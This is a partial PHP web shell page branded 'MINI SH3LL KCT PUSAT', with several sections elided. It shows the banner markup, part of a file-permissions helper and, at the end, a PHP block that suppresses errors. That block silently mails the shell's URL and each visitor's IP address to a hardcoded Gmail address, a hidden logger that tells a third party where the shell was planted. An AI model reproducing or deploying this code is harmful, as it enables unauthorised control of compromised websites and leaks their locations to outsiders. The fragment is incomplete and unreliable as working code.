...
<title>MINI SH3LL KCT PUSAT</title><link rel="SHORTCUT ICON"  href="https://l.top4top.io/p_1686xowgp4.jpg">
<style>
body{ 
...
<H1><center>MINI SH3LL KCT PUSAT</center></H1>
<DIV align=center><IMG src="https://l.top4top.io/p_1686xowgp4.jpg" width=250 height=250><br>
...
echo '<br /><font color="red"></font><font color="blue">MINI SH3LL KCT PUSAT</font>
</BODY>
</HTML>';
function perms($file){
...
?>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'tnplankton862@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
